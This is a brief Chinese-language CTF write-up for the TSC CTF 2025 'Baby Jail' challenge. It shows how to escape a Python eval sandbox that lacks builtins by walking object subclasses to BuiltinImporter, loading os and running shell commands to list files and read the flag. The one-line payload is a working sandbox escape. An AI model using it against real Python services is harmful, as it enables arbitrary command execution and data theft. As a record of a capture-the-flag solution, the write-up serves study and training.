##### tags:`TSC_CTF_2025`

# TSC CTF MISC：Baby Jail

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

## <span class="red">**題目**</span>

- ![image](https://hackmd.io/_uploads/SyOUiH7Dyl.png)

&emsp;

## <span class="red">**解題過程**</span>

1. **可以看到這題明顯把 ```__builtins__``` 和 ```__global__``` 刪除掉了，所以想要成功打進去就必須要用 python 的繼承語法(題目沒有擋 ```__class__``` )**

- **```eval()``` 的第一個 argument 控制的是<span class="red">局部命名空間</span>。第二個 argument 控制的是<span class="red">全局命名空間(也就是 ```__global```)</span>**

2. **在幾經嘗試後，成功發現可行的 payload 是：**

- **```(lambda: [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("ls /"))()```**

- **這裡使用的 ```BuiltinImporter``` 負責處理內建 module 的導入操作，可以讓我們動態導入 module ，我們這邊導入 ```os``` 的效果就像是使用 ```__import__('os')```**

&emsp;

3. **在我們成功後，找到 flag 檔名後就能把它 cat 出來，或是向我這邊直接使用 * match 所有 / 底下檔名為 flag 開頭的檔案**

- ![image](https://hackmd.io/_uploads/BJoL3iEDJg.png)
